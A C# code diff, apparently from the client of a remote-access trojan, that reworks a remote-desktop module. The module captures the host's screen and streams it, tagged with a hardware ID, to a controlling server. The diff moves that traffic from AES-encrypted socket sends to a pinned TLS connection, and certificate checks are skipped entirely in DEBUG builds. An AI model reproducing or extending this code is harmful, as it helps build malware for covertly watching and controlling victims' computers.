@@ -10,6 +10,9 @@ using Client.Helper;
 using System;
 using Client.StreamLibrary.UnsafeCodecs;
 using Client.StreamLibrary;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+using System.Security.Authentication;
 
 namespace Client.Handle_Packet
 {
@@ -21,6 +24,9 @@ namespace Client.Handle_Packet
             {
                 Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
+
+                SslStream SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
 
                 string hwid = Methods.HWID();
                 IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
@@ -42,8 +48,10 @@ namespace Client.Handle_Packet
                             msgpack.ForcePathObject("ID").AsString = hwid;
                             msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
 
-                            Client.Send(BitConverter.GetBytes(Settings.aes256.Encrypt(msgpack.Encode2Bytes()).Length));
-                            Client.Send(Settings.aes256.Encrypt(msgpack.Encode2Bytes()));
+                            SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
+                            SslClient.Write(msgpack.Encode2Bytes());
+                            SslClient.Flush();
+                            Thread.Sleep(100);
                         }
                     }
                     bmp.UnlockBits(bmpData);
@@ -66,5 +74,14 @@ namespace Client.Handle_Packet
             }
             catch { return new Bitmap(rect.Width, rect.Height); }
         }
+
+        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        {
+#if DEBUG
+            return true;
+#endif
+            return Settings.ServerCertificate.Equals(certificate);
+        }
+
     }
 }
